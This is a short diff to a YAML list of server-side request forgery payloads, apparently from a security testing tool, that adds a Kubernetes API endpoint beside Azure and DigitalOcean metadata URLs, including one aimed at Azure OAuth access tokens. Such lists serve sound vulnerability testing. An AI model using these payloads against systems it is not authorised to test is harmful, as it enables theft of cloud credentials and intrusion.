@@ -85,3 +85,4 @@ cloud_payloads:
   - ["azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["compute"]]
   - ["azure_token", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", ["access_token"]]
   - ["digital_ocean", "http://169.254.169.254/metadata/v1/", ["digitalocean"]]
+  - ["kubernetes", "https://kubernetes.default.svc/api/v1/namespaces", ["metadata"]]
